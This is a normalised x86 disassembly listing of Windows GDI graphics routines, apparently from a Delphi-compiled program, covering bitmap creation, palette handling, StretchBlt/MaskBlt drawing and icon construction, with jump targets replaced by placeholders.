push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4217b9
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4217bc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_421858
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_421768
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4042a8
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42185f
lea eax [ ebp - 0x104 ]
call sub_404038
retn
sub_421874
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_4219c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_421931
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4217bc
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4217bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4219c9
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_4219d4
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_421a08
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_421864
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_421c88
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_421864
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421c8f
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_421864
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_421adb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406ce0
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421c8f
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_421c9c
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_421cd4
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402cfc
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_421d4c
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_421da4
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_402968
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421ea1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421ea8
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_421ebc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_421f42
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_421f54
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_402968
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_421d4c
mov eax esp
call sub_421ebc
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_421ff8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_421d4c
mov [ esp ] eax
sub_42204c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_4219f4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_4219d4
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4221f8
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_421864
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42211e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_421874
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422125
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_421768
sub_422125
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_4219f4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_421864
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4221d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_421874
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221df
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_422214
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4222a4
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e34
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_42259b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_42238d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_421768
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422394
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_422394
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_422208
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407e34
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_42257b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_42204c
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407e34
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_422558
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42255f
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_40278c
retn
call sub_4217bc
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_422208
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_422214
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4225c4
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_421744
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cfc
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_4219f4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_4226a8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4225c4
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_422714
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4225c4
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4227b1
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4227b8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_4227e8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402cfc
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402cfc
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_4227dc
xor edx edx
push ebp
push sub_4229d6
